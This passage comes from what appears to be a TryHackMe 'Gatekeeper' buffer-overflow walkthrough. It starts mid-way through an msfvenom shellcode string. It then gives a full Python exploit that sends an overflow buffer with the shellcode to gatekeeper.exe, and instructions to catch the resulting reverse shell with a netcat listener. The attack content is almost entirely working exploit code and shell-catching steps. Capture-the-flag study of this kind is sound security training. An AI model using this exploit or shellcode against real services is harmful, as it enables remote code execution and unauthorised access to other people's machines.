"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
"\x36\x65\x59\x74\x36\xac")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
- ![image](https://user-images.githubusercontent.com/94720207/169708756-d21de7b0-e434-4972-8ab7-86a28c0e4bb9.png)

- **You can now exploit the buffer overflow to get a reverse shell!**

    - Start a netcat listener on your Kali box using the `LPORT` you specified in the `msfvenom` command eg. `4444`
    
        - `rlwrap nc -nlvp 4444`
        
        - ![image](https://user-images.githubusercontent.com/94720207/169708775-d35349cf-2ecb-4cec-8e3b-6bff31f3c72a.png)
  
    - Restart `gatekeeper.exe` (`Immunity Debugger` not needed anymore) and run the modified `overflow_gatekeeper_step567_Final_Payload.py` script.
    
    - Que chille!!!
    
        - `python3 overflow_gatekeeper_step567_Final_Payload.py` 

        - **Your netcat listener should catch a reverse shell!**
        
            - ![image](https://user-images.githubusercontent.com/94720207/169681296-145d3592-3b28-4929-8dfe-14a94911bae5.png)















---

### References

- https://steflan-security.com/tryhackme-gatekeeper-walkthrough/
- https://github.com/hamza07-w/gatekeeper-tryHackme-writeup
